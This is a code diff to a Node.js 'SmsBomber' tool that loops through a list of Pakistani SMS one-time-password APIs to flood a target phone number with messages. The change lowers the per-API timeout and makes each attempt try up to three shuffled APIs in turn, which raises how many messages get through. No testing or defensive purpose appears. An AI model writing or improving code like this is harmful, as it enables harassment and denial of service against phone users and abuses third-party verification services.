@@ -14,7 +14,8 @@ const https = require('https');
 const DEFAULT_DURATION_MINUTES = 1;
 const REQUEST_DELAY_MIN_MS = 200;
 const REQUEST_DELAY_MAX_MS = 600;
-const API_TIMEOUT_MS = 4000;
+const API_TIMEOUT_MS = 2500;      // Per-API timeout — if exceeded, move to next API immediately
+const MAX_APIS_PER_ATTEMPT = 3;   // Max APIs to try per attempt (speed vs coverage balance)
 
 // ---------- PAKISTAN SMS OTP APIS ----------
 const SMS_APIS = [
@@ -193,10 +194,24 @@ class SmsBomber extends EventEmitter {
     });
   }
 
-  // ---------- FULL ATTEMPT — tries ONE random API ----------
+  // ---------- FULL ATTEMPT — tries up to MAX_APIS_PER_ATTEMPT APIs ----------
+  // If one times out or fails, immediately starts the next — no waiting.
   async _sendSms() {
-    const randomApi = SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)];
-    return await this._callApi(randomApi);
+    const shuffled = [...SMS_APIS].sort(() => Math.random() - 0.5);
+    const toTry = shuffled.slice(0, MAX_APIS_PER_ATTEMPT);
+
+    for (const api of toTry) {
+      const result = await this._callApi(api);
+      if (result.success) {
+        // Got a response (any 2xx-4xx) — count it and move on
+        return result;
+      }
+      // Timeout / connection error — immediately try next API (no extra delay)
+    }
+
+    // All tried APIs failed — return the last result
+    const last = await this._callApi(toTry[toTry.length - 1]);
+    return last;
   }
 
   // ---------- MAIN LOOP ----------
